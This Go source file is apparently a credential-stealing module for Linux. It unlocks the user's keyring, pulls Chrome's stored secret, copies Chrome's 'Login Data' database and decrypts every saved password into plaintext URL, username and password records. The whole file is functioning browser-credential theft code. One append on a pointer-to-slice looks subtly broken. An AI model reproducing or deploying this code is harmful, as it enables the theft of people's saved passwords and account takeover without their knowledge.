package linux

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"database/sql"
	"errors"
	"fmt"
	"main/utils"
	"os"
	"path/filepath"

	_ "github.com/mattn/go-sqlite3"
	ss "github.com/zalando/go-keyring/secret_service"
	"golang.org/x/crypto/pbkdf2"
)

const (
	salt         = "saltysalt"
	iv           = "                "
	iterations   = 1
	aescbcLength = 16
)

func getKeyringPwd() ([]byte, error) {
	svc, err := ss.NewSecretService()
	if err != nil {
		return nil, err
	}
	collection := svc.GetLoginCollection()
	err = svc.Unlock(collection.Path())
	if err != nil {
		return nil, err
	}
	search := map[string]string{
		"application": "chrome",
	}
	results, err := svc.SearchItems(collection, search)
	if err != nil {
		return nil, err
	}
	if len(results) == 0 {
		return nil, errors.New(fmt.Sprintf("Secret not found in keyring."))
	}
	item := results[0]
	session, err := svc.OpenSession()
	if err != nil {
		return nil, err
	}
	defer svc.Close(session)
	secret, err := svc.GetSecret(item, session.Path())
	if err != nil {
		return nil, err
	}
	return secret.Value, nil
}

func decryptValue(encValue, password []byte) (string, error) {
	key := pbkdf2.Key(password, []byte(salt), iterations, aescbcLength, sha1.New)
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	decrypted := make([]byte, len(encValue))
	cbc := cipher.NewCBCDecrypter(block, []byte(iv))
	cbc.CryptBlocks(decrypted, encValue)
	if len(decrypted)%aescbcLength != 0 {
		return "", errors.New(
			fmt.Sprintf("Decrypted data block length is not a multiple of %d.", aescbcLength))
	}
	paddingLen := int(decrypted[len(decrypted)-1])
	if paddingLen > 16 {
		return "", errors.New(fmt.Sprintf("Invalid last block padding length: %d.", paddingLen))
	}
	return string(decrypted[:len(decrypted)-paddingLen]), nil
}

func getLoginData(loginDataPath string, password []byte) (*[]utils.LoginData, error) {
	var (
		allLoginData *[]utils.LoginData
		url          string
		username     string
		encValue     []byte
	)
	db, err := sql.Open("sqlite3", loginDataPath)
	if err != nil {
		return nil, err
	}
	defer db.Close()
	query := "SELECT signon_realm, username_value, password_value FROM logins"
	rows, err := db.Query(query)
	if err != nil {
		return nil, err
	}
	for rows.Next() {
		rows.Scan(&url, &username, &encValue)
		if username == "" {
			continue
		}
		decValue, err := decryptValue(encValue[3:], password)
		if err != nil {
			return nil, err
		}
		if decValue == "" {
			continue
		}
		d := utils.LoginData{
			URL:      url,
			Username: username,
			Password: decValue,
		}
		allLoginData = append(allLoginData, d)
	}
	return &allLoginData, nil
}

func Run() (*[]utils.LoginData, error) {
	cfgPath, _ := os.UserConfigDir()
	loginDataPath := filepath.Join(cfgPath, "google-chrome", "Default", "Login Data")
	loginDataPath, err := utils.MakeBackup(loginDataPath)
	if err != nil {
		return nil, err
	}
	defer os.Remove(loginDataPath)
	password, err := getKeyringPwd()
	if err != nil {
		return nil, err
	}
	loginData, err := getLoginData(loginDataPath, password)
	if err != nil {
		return nil, err
	}
	return loginData, nil
}
